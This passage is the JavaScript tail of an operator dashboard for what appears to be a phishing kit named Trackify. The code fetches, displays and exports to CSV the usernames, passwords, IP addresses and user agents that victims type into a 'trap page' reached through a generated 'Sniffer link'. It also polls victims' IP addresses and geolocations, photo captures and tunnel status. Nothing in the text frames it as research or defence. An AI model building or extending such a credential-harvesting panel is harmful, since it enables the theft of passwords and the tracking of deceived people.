                return '';
            }
            const d = new Date(String(iso));
            if (isNaN(d.getTime())) {
                return String(iso);
            }
            const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
            const day = d.getDate();
            const dayStr = day < 10 ? '0' + day : String(day);
            let h = d.getHours();
            const am = h >= 12 ? 'PM' : 'AM';
            h = h % 12;
            if (h === 0) {
                h = 12;
            }
            const min = d.getMinutes();
            const minStr = min < 10 ? '0' + min : String(min);
            return months[d.getMonth()] + ' ' + dayStr + ' ' + d.getFullYear() + ' ' + h + ':' + minStr + ' ' + am;
        }

        function csvEscapeCell(val) {
            const s = String(val == null ? '' : val);
            if (/[",\n\r]/.test(s)) {
                return '"' + s.replace(/"/g, '""') + '"';
            }
            return s;
        }

        function exportSavedInfoCsv() {
            if (!lastSavedInfoEntries || lastSavedInfoEntries.length === 0) {
                return;
            }
            const headers = ['Time (UTC)', 'Login', 'Password', 'Template', 'IP', 'User agent'];
            const lines = lastSavedInfoEntries.map(function (row) {
                return [
                    row.at || '',
                    row.login || '',
                    row.password || '',
                    row.template_label || row.template || '',
                    row.ip || '',
                    row.user_agent || ''
                ].map(csvEscapeCell).join(',');
            });
            const csv = '\uFEFF' + headers.map(csvEscapeCell).join(',') + '\n' + lines.join('\n');
            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'trackify-saved-logins-' + new Date().toISOString().slice(0, 19).replace(/[:T]/g, '-') + '.csv';
            document.body.appendChild(a);
            a.click();
            a.remove();
            URL.revokeObjectURL(a.href);
            const toast = document.getElementById('toast');
            if (toast) {
                toast.textContent = 'CSV exported';
                toast.classList.add('show');
                setTimeout(function () { toast.classList.remove('show'); }, 2000);
            }
        }

        async function loadSavedInfo() {
            const wrap = document.getElementById('savedInfoWrap');
            const maxEl = document.getElementById('savedInfoMax');
            const countMeta = document.getElementById('savedInfoCountMeta');
            const exportBtn = document.getElementById('exportSavedInfoBtn');
            if (!wrap) {
                return;
            }
            try {
                const res = await fetch(API + '?action=saved_info', { credentials: 'same-origin' });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success' || !Array.isArray(data.entries)) {
                    lastSavedInfoEntries = [];
                    if (exportBtn) {
                        exportBtn.disabled = true;
                    }
                    if (countMeta) {
                        countMeta.textContent = '';
                    }
                    wrap.innerHTML = '<div class="saved-info-empty">Could not load saved entries.</div>';
                    return;
                }
                if (maxEl && data.max_entries != null) {
                    maxEl.textContent = String(data.max_entries);
                }
                if (data.entries.length === 0) {
                    lastSavedInfoEntries = [];
                    if (exportBtn) {
                        exportBtn.disabled = true;
                    }
                    if (countMeta) {
                        countMeta.textContent = data.max_entries != null ? '0 / ' + data.max_entries : '';
                    }
                    wrap.innerHTML = '<div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a Sniffer link and submit the trap page form.</div>';
                    return;
                }
                lastSavedInfoEntries = data.entries;
                if (exportBtn) {
                    exportBtn.disabled = false;
                }
                if (countMeta) {
                    countMeta.textContent = data.max_entries != null
                        ? (data.entries.length + ' / ' + data.max_entries)
                        : String(data.entries.length);
                }
                let html = '<div class="saved-info-table-scroll"><table class="saved-info-table"><thead><tr>';
                html += '<th scope="col" class="saved-info-col-time">Time</th><th scope="col" class="saved-info-col-login">Login</th><th scope="col" class="saved-info-col-password">Password</th><th scope="col" class="saved-info-col-template">Template</th><th scope="col" class="saved-info-col-ip">IP</th><th scope="col" class="saved-info-col-ua">User agent</th>';
                html += '</tr></thead><tbody>';
                data.entries.forEach(function (row) {
                    const rawAt = row.at || '';
                    const displayAt = formatSavedLoginAt(rawAt);
                    const tpl = escapeHtmlText(row.template_label || row.template || '');
                    const titleAt = escapeHtmlAttr(rawAt);
                    html += '<tr><td class="saved-info-col-time saved-info-cell-time" title="' + titleAt + '">' + escapeHtmlText(displayAt) + '</td>';
                    html += '<td class="saved-info-col-login saved-info-cell-mono">' + escapeHtmlText(row.login || '') + '</td>';
                    html += '<td class="saved-info-col-password saved-info-cell-mono">' + escapeHtmlText(row.password || '') + '</td>';
                    html += '<td class="saved-info-col-template saved-info-cell-template">' + tpl + '</td>';
                    html += '<td class="saved-info-col-ip saved-info-cell-mono">' + escapeHtmlText(row.ip || '') + '</td>';
                    html += '<td class="saved-info-col-ua">' + escapeHtmlText(row.user_agent || '') + '</td></tr>';
                });
                html += '</tbody></table></div>';
                wrap.innerHTML = html;
            } catch (e) {
                lastSavedInfoEntries = [];
                if (exportBtn) {
                    exportBtn.disabled = true;
                }
                if (countMeta) {
                    countMeta.textContent = '';
                }
                wrap.innerHTML = '<div class="saved-info-empty">Could not load saved entries.</div>';
            }
        }

        async function clearSavedInfo() {
            if (!confirm('Clear all saved login entries for your account? This cannot be undone.')) {
                return;
            }
            const btn = document.getElementById('clearSavedInfoBtn');
            if (btn) {
                btn.disabled = true;
            }
            try {
                const res = await fetch(API + '?action=clear_saved_info', {
                    method: 'POST',
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success') {
                    alert(data.message || 'Could not clear saved entries');
                    return;
                }
                await loadSavedInfo();
                const toast = document.getElementById('toast');
                toast.textContent = 'Saved entries cleared';
                toast.classList.add('show');
                setTimeout(function () { toast.classList.remove('show'); }, 2000);
            } catch (err) {
                alert('Could not clear: ' + (err && err.message ? err.message : String(err)));
            } finally {
                if (btn) {
                    btn.disabled = false;
                }
            }
        }

        (function initSupportPrompt() {
            const prompt = document.getElementById('supportPrompt');
            const continueBtn = document.getElementById('supportContinueBtn');
            if (!prompt || !continueBtn) return;
            const storageKey = 'trackify_support_prompt_hidden';
            try {
                if (localStorage.getItem(storageKey) === '1') {
                    prompt.hidden = true;
                }
            } catch (e) {}

            continueBtn.addEventListener('click', function () {
                prompt.hidden = true;
                try {
                    localStorage.setItem(storageKey, '1');
                } catch (e) {}
            });
        })();

        async function loadCaptures() {
            try {
                const res = await fetch(API + '?action=captures', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.status === 'success' && data.data) {
                    const geo = data.data.geolocations || [];
                    const fromGeo = geo.map(g => ({
                        ip: g.ip,
                        time: g.timestamp,
                        loc: (g.geo && (g.geo.location || g.geo.city)) || g.location || g.city
                    }));
                    const fromIps = (data.data.ips || []).map(row => ({
                        ip: row.ip || 'N/A',
                        time: row.time || '',
                        loc: ''
                    }));
                    const allRows = [...fromGeo, ...fromIps];
                    allRows.sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));
                    if (allRows.length === 0) {
                        capturesList.innerHTML = '<div class="empty-state">No captures yet</div>';
                    } else {
                        capturesList.innerHTML = allRows.slice(0, 10).map(c => `
                            <div class="capture-item">
                                <span class="ip">${c.ip || 'N/A'}</span>
                                ${c.loc ? '<br><span style="color:var(--text-muted);font-size:12px">' + String(c.loc).substring(0, 35) + '</span>' : ''}
                                <div class="time">${c.time || ''}</div>
                            </div>
                        `).join('');
                    }
                }
            } catch (e) {}
        }

        async function checkStatus() {
            try {
                const res = await fetch(API + '?action=status', { credentials: 'same-origin' });
                const data = await res.json();
                const stopBtnSidebarEl = document.getElementById('stopBtnSidebar');
                if (data.link) {
                    statusDisplay.innerHTML = '<span class="status-badge active">Tunnel active</span>';
                    statusLink.textContent = data.link;
                    trackerLinkInput.value = data.link;
                } else {
                    statusDisplay.innerHTML = '<span class="status-badge inactive">Tunnel inactive</span>';
                    statusLink.textContent = '';
                    trackerLinkInput.value = '';
                }
                syncTrackifyTunnelRow(data.link, !!data.show_stop_tunnel);
                if (data.show_stop_tunnel) {
                    if (stopBtnSidebarEl) {
                        stopBtnSidebarEl.style.display = 'block';
                    }
                } else {
                    if (stopBtnSidebarEl) {
                        stopBtnSidebarEl.style.display = 'none';
                    }
                }
                const siBox = document.getElementById('siLinkBox');
                const siIn = document.getElementById('siTrackerLink');
                const siSt = document.getElementById('siStopBtn');
                if (data.saveinfo_link) {
                    if (siBox) {
                        siBox.style.display = 'flex';
                    }
                    if (siIn) {
                        siIn.value = data.saveinfo_link;
                    }
                    if (siSt) {
                        siSt.style.display = 'inline-flex';
                    }
                } else {
                    if (siBox) {
                        siBox.style.display = 'none';
                    }
                    if (siIn) {
                        siIn.value = '';
                    }
                    if (siSt) {
                        siSt.style.display = 'none';
                    }
                }
            } catch (e) {}
        }

        let lastTerminalEvents = [];
        async function pollTerminalEvents() {
            try {
                const res = await fetch(API + '?action=terminal', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.events && data.events.length > 0) {
                    for (const ev of data.events) {
                        if (lastTerminalEvents.includes(ev.type + ev.content)) continue;
                        lastTerminalEvents.push(ev.type + ev.content);
                        appendTerminalEventToRoot(terminalEl, ev);
                        appendTerminalEventToRoot(saveInfoTerminalEl, ev);
                        if (ev.type === 'saved_login') {
                            const sil = document.getElementById('saveInfoLayout');
                            if (sil && sil.style.display === 'block') {
                                loadSavedInfo();
                            }
                        }
                    }
                }
            } catch (e) {}
        }

        (function initUserNav() {
            const nav = document.getElementById('userNav');
            const trigger = document.getElementById('userNavTrigger');
            const menu = document.getElementById('userNavMenu');
            if (!nav || !trigger || !menu) return;

            function closeMenu() {
                trigger.setAttribute('aria-expanded', 'false');
                menu.hidden = true;
            }
            function toggleMenu() {
                const open = trigger.getAttribute('aria-expanded') === 'true';
                if (open) {
                    closeMenu();
                } else {
                    trigger.setAttribute('aria-expanded', 'true');
                    menu.hidden = false;
                }
            }

            trigger.addEventListener('click', function (e) {
                e.stopPropagation();
                toggleMenu();
            });
            nav.addEventListener('click', function (e) {
                e.stopPropagation();
            });
            document.addEventListener('click', function () {
                closeMenu();
            });
            document.addEventListener('keydown', function (e) {
                if (e.key === 'Escape') closeMenu();
            });
        })();

        setInterval(() => { loadPhotos(currentPage); loadCaptures(); }, 5000);
        setInterval(checkStatus, 10000);
        setInterval(pollTerminalEvents, 2000);
        checkStatus();
        loadPhotos(1);
        loadCaptures();
    </script>
</body>
</html>
